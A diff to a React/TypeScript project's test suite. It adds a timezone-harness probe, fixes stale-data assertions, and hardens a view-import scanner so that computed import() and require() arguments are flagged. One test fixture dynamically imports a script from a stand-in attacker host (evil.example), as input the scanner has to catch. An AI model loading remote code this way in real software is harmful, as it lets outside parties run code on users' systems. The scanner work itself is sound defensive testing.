@@ -266,6 +266,37 @@ describe('Board card — one clock, and it is not the viewer’s laptop', () => 
     expect(unfoldUnder('Pacific/Niue')).not.toContain('18 Aug');
   });
 
+  /**
+   * THE PROBE THAT KEEPS THE THREE TESTS ABOVE FROM BEING VACUOUS, and it is
+   * not ceremony. Under vitest's `threads` pool, `process.env.TZ = zone` does
+   * not move the clock AT ALL — a worker thread does not get the process-level
+   * reconfiguration — so `unfoldUnder` returns the ambient rendering for every
+   * zone and all three assertions above pass while proving nothing. Measured:
+   * `npx vitest run --pool=threads test/views/board.test.tsx` was 32/32 green
+   * before this probe existed, and two zones render identically inside a
+   * `new Worker(...)` while differing on the main thread.
+   *
+   * `test/provenance.test.ts` has carried this probe since T6, which is why
+   * the same condition surfaces there as a failure and surfaced here as three
+   * green tests. A claim about a zone needs a check that the zone can move.
+   */
+  it('the harness above really can move the ambient zone — otherwise it proves nothing', () => {
+    const original = process.env.TZ;
+    try {
+      process.env.TZ = 'Pacific/Kiritimati';
+      const east = new Date('2026-08-19T10:05:00.000Z').toLocaleString();
+      process.env.TZ = 'Pacific/Niue';
+      const west = new Date('2026-08-19T10:05:00.000Z').toLocaleString();
+      expect(east).not.toBe(west);
+    } finally {
+      // The delete-when-unset form. `provenance.test.ts:104,130` still carry
+      // the naive spelling this describe had to be fixed for — same class,
+      // latent, no observable harm today; recorded, owner Plan 6a.
+      if (original === undefined) delete process.env.TZ;
+      else process.env.TZ = original;
+    }
+  });
+
   it('PLANTED DEFECT: the zone swap hands the worker back exactly the TZ it borrowed', () => {
     // This test SETS the two configurations rather than observing whichever it
     // inherits, and that is not tidiness. Written the observing way — read
@@ -355,9 +386,20 @@ const ALLOWED_IMPORTS = /^(react(\/|$)|@gisik-nokma\/(ui|domain|rule-engine)(\/|
 const IMPORT_FORMS = [
   /\bfrom\s*['"]([^'"]+)['"]/g,
   /\bimport\s+['"]([^'"]+)['"]/g,
-  /\bimport\s*\(\s*['"]([^'"]+)['"]/g,
-  /\brequire\s*\(\s*['"]([^'"]+)['"]/g,
 ];
+
+/**
+ * `import(...)` and `require(...)` are read as CALLS, not as quoted literals,
+ * because their argument need not be one. A template literal or a
+ * concatenation carries a specifier that a quoted-literal pattern extracts as
+ * NOTHING — not as a suspicious entry, as an empty result — so the guard would
+ * report the file clean. An argument that is not exactly one quoted string is
+ * reported as `<computed>`, which no allow-list entry matches: a view module
+ * assembling its import target at runtime is precisely what this scan exists
+ * to see.
+ */
+const CALL_IMPORT = /\b(?:import|require)\s*\(([^)]*)\)/g;
+const ONE_STRING_LITERAL = /^\s*(['"])([^'"]*)\1\s*$/;
 
 function stripComments(source: string): string {
   return source.replace(/\/\*[\s\S]*?\*\//g, ' ').replace(/(^|[^:])\/\/.*$/gm, '$1');
@@ -370,7 +412,14 @@ function networkTells(source: string): string[] {
 
 function importsOf(source: string): string[] {
   const code = stripComments(source);
-  return IMPORT_FORMS.flatMap((pattern) => [...code.matchAll(pattern)].map((match) => match[1] ?? ''));
+  const found = IMPORT_FORMS.flatMap((pattern) =>
+    [...code.matchAll(pattern)].map((match) => match[1] ?? ''),
+  );
+  for (const call of code.matchAll(CALL_IMPORT)) {
+    const literal = ONE_STRING_LITERAL.exec(call[1] ?? '');
+    found.push(literal ? (literal[2] ?? '') : '<computed>');
+  }
+  return found;
 }
 
 /**
@@ -415,6 +464,14 @@ describe('the view-import scan is proven against planted defects before it is tr
     expect(importsOf("const a = require('axios');")).toEqual(['axios']);
   });
 
+  it('PLANTED DEFECT: a specifier the scan cannot READ is reported, not skipped', () => {
+    // The failure mode being closed is silence: a quoted-literal pattern
+    // returns `[]` for both of these, and `[]` is what a clean file returns.
+    expect(importsOf('await import(`https://evil.example/${x}.js`);')).toEqual(['<computed>']);
+    expect(importsOf("const a = require('react' + '-router-dom');")).toEqual(['<computed>']);
+    expect(ALLOWED_IMPORTS.test('<computed>')).toBe(false);
+  });
+
   it('PLANTED DEFECT: `import type` is an import, and a type-only door is still a door', () => {
     expect(importsOf("import type { Something } from 'react-router-dom';")).toEqual([
       'react-router-dom',
@@ -451,8 +508,15 @@ describe('the view-import scan is proven against planted defects before it is tr
     // the flat walk below is this assertion's own positive control — it shows
     // exactly what the recursion adds.
     const parent = join(VIEWS_DIRECTORY, '..');
+    const flat = readdirSync(parent).map((entry) => String(entry));
     expect(viewFiles(parent)).toContain(`views${sep}board.tsx`);
-    expect(readdirSync(parent).filter((name) => name.endsWith('.tsx'))).toEqual([]);
+    // The control is the same directory walked flat: it cannot see the file
+    // the recursive walk finds. Stated as "does not contain THIS file" rather
+    // than "contains no .tsx at all", which would start failing the day a
+    // legitimate `.tsx` lands directly in `src/` — for a reason having nothing
+    // to do with recursion.
+    expect(flat).not.toContain(`views${sep}board.tsx`);
+    expect(flat).not.toContain('board.tsx');
   });
 });
 
@@ -600,6 +664,16 @@ describe('useBoard — a project switch is a different question, and it gets ask
       expect(screen.getByText('board:prj_A')).toBeInTheDocument();
 
       view.rerender(<Switcher source={source} projectId="prj_B" />);
+      // Asserted BEFORE the flush, and that placement is the whole test.
+      // `setData(null)` on key change is the half of the fix that bounds the
+      // wrong-project window to the switch itself — and after the flush the new
+      // answer has already overwritten the old one, so a check placed there
+      // passes with the clear deleted. It did: mutation M-A removed both clear
+      // lines and all 128 tests stayed green. RTL's `rerender` is act-wrapped,
+      // so passive effects have run when it returns while `getBoard`'s promise
+      // continuation, a microtask, cannot have.
+      expect(screen.queryByText('board:prj_A')).not.toBeInTheDocument();
+      expect(screen.getByText('loading')).toBeInTheDocument();
       await act(async () => {
         await vi.runAllTimersAsync();
       });
